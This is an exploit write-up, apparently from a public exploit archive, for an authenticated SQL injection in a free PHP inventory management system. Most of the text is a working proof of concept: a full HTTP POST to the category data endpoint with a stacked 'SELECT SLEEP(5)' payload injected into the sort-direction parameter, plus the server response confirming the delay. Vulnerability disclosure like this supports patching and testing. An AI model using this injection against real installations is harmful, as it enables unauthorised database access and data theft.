
**Exploit Title:** Free and Open Source inventory management system php - Authenticated SQL Injection
**Date**: 4/08/2023
**Exploit Author:** y3thu
**Vendor Homepage:** https://www.sourcecodester.com/users/mayurik
**Software Link:** https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html
**Attack Vector:** WEB, Network
**Testeted on:** Windows 10  using XAMPP

**POST Authenticated SQL Injection**
**POC**
**payload:** `;SELECT SLEEP(5)`


    POST /ample/app/ajax/catagory_data.php HTTP/1.1
    Host: localhost
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 983
    Origin: http://localhost
    Connection: close
    Referer: http://localhost/ample/index.php?page=category
    Cookie: PHPSESSID=g11ukg4bi8dvr9q9uqvsslpm3t
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    
    draw=1&columns%5B0%5D%5Bdata%5D=id&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=true&columns%5B0%5D%5Borderable%5D=true&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=name&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=description&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=action&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=true&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=asc;SELECT SLEEP(5)&start=0&length=10&search%5Bvalue%5D=&search%5Bregex%5D=false

**Response after 5 seconds (the sleep has been executed)**

     
    HTTP/1.1 200 OK
    Date: Fri, 04 Aug 2023 06:49:50 GMT
    Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
    X-Powered-By: PHP/7.4.30
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Content-Length: 2174
    Connection: close
    Content-Type: text/html; charset=UTF-8

